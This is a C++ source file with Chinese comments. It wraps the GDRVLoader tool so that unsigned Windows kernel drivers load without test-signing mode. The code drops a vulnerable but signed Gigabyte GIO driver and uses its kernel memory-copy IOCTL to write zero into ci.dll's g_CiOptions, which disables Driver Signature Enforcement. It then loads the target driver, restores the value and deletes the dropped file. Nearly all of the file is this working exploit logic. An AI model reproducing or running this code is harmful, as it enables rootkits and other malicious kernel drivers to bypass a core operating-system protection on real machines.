/*
 * gdrv_bridge.cpp - GDRVLoader DSE 绕过集成层
 *
 * 完整保留 GDRVLoader (zer0condition/GDRVLoader) 的核心逻辑：
 *   利用已签名的 Gigabyte GIO 漏洞驱动的任意内核内存读写 IOCTL，
 *   临时修改内核 ci.dll!g_CiOptions (Win8+) / ntoskrnl!g_CiEnabled (Win7)
 *   为 0 以禁用 DSE，加载未签名驱动后立即恢复原值。
 *
 * 流程（无需 testsigning / 无需测试模式）：
 *   1. 从内嵌字节数组释放 Gigabyte GIO 漏洞驱动到 %SystemRoot%\System32\Drivers\gdrv.sys
 *   2. AnalyzeCi: 映射 ci.dll 到用户态，特征码定位内核 g_CiOptions 地址
 *   3. 提权 SE_LOAD_DRIVER_PRIVILEGE
 *   4. 创建目标驱动服务注册表项
 *   5. 创建漏洞驱动服务注册表项
 *   6. TriggerExploit(禁用DSE):
 *      - NtLoadDriver 加载已签名的 GIO 漏洞驱动
 *      - 打开 \Device\GIO 设备
 *      - IOCTL_GIO_MEMCPY 读取当前 g_CiOptions
 *      - IOCTL_GIO_MEMCPY 写入 0 到 g_CiOptions → DSE 禁用
 *   7. NtLoadDriver 加载未签名的目标驱动（DSE 已临时禁用）
 *   8. TriggerExploit(恢复DSE): 写回原始 g_CiOptions 值
 *   9. 卸载漏洞驱动，删除其服务项，恢复权限
 *
 * 核心实现在 gdrvloader/exploit/swind2.cpp (WindLoadDriver / WindUnloadDriver)
 * 和 gdrvloader/exploit/pe.cpp (MapFileSectionView) 中，本文件为 C 链接包装层。
 */
#include "gdrvloader/global.h"
#include "gdrvloader/binary/dropper.h"

/* 漏洞驱动释放路径（与 GDRVLoader 原版一致） */
static const wchar_t* k_LoaderDriverPath = L"C:\\Windows\\System32\\Drivers\\gdrv.sys";

/* 保存最后一次 NTSTATUS，供调用方查询 */
static NTSTATUS g_LastNtStatus = STATUS_SUCCESS;

extern "C" {

/*
 * GdrvLoadDriver - 通过 DSE 绕过加载未签名驱动
 *
 * 完整执行 GDRVLoader 的 DSE 绕过流程，无需 testsigning。
 *
 * 参数:
 *   targetDriverPath - 目标驱动 .sys 文件的完整路径（宽字符）
 *
 * 返回:
 *   0  成功
 *   1  参数无效
 *   2  释放漏洞驱动失败
 *   3  DSE 绕过 / 加载驱动失败（调用 GdrvGetLastStatus 获取 NTSTATUS）
 */
int GdrvLoadDriver(const wchar_t* targetDriverPath)
{
    if (!targetDriverPath || targetDriverPath[0] == L'\0') {
        g_LastNtStatus = STATUS_INVALID_PARAMETER;
        return 1;
    }

    printf("[GDRVLoader] Target driver: %ls\n", targetDriverPath);

    /* ---- 步骤1: 释放 Gigabyte GIO 漏洞驱动到磁盘 ---- */
    printf("[GDRVLoader] Step 1: Dropping vulnerable Gigabyte GIO driver to %ls\n", k_LoaderDriverPath);
    if (!DropDriverFromBytes(k_LoaderDriverPath)) {
        printf("[GDRVLoader] ERROR: Failed to drop vulnerable driver.\n");
        g_LastNtStatus = STATUS_UNSUCCESSFUL;
        return 2;
    }

    /* ---- 步骤2-9: WindLoadDriver 执行完整 DSE 绕过流程 ----
     *
     * WindLoadDriver 内部执行:
     *   - AnalyzeCi: 定位内核 ci.dll!g_CiOptions 地址
     *   - 提权 SE_LOAD_DRIVER_PRIVILEGE
     *   - 创建目标驱动 + 漏洞驱动的服务注册表项
     *   - 加载 GIO 漏洞驱动（已签名，可正常加载）
     *   - IOCTL_GIO_MEMCPY 读 g_CiOptions 原值
     *   - IOCTL_GIO_MEMCPY 写 0 → DSE 禁用
     *   - NtLoadDriver 加载未签名目标驱动
     *   - IOCTL_GIO_MEMCPY 写回原值 → DSE 恢复
     *   - 卸载漏洞驱动，清理服务项
     */
    printf("[GDRVLoader] Step 2-9: Executing DSE bypass via Gigabyte GIO exploit...\n");
    printf("[GDRVLoader]   (This temporarily patches kernel g_CiOptions, no testsigning needed)\n");

    g_LastNtStatus = WindLoadDriver(
        (PWCHAR)k_LoaderDriverPath,   /* 已签名的漏洞驱动路径 */
        (PWCHAR)targetDriverPath,      /* 未签名的目标驱动路径 */
        FALSE);                         /* Hidden=FALSE: 加载后保留服务项 */

    if (!NT_SUCCESS(g_LastNtStatus)) {
        printf("[GDRVLoader] ERROR: WindLoadDriver failed with NTSTATUS 0x%08X\n", g_LastNtStatus);
        /* 清理漏洞驱动文件 */
        DeleteFileW(k_LoaderDriverPath);
        return 3;
    }

    printf("[GDRVLoader] SUCCESS: Unsigned driver loaded without testsigning.\n");

    /* ---- 清理: 删除漏洞驱动文件 ---- */
    DeleteFileW(k_LoaderDriverPath);

    return 0;
}

/*
 * GdrvUnloadDriver - 卸载目标驱动
 *
 * 参数:
 *   driverPath - 驱动 .sys 文件路径（用于推导服务名）或服务名
 *
 * 返回:
 *   0  成功
 *   非0 失败
 */
int GdrvUnloadDriver(const wchar_t* driverPath)
{
    if (!driverPath) {
        g_LastNtStatus = STATUS_INVALID_PARAMETER;
        return 1;
    }
    g_LastNtStatus = WindUnloadDriver((PWCHAR)driverPath, FALSE);
    return NT_SUCCESS(g_LastNtStatus) ? 0 : 1;
}

/*
 * GdrvGetLastStatus - 获取最后一次操作的 NTSTATUS
 */
unsigned long GdrvGetLastStatus(void)
{
    return (unsigned long)g_LastNtStatus;
}

} /* extern "C" */
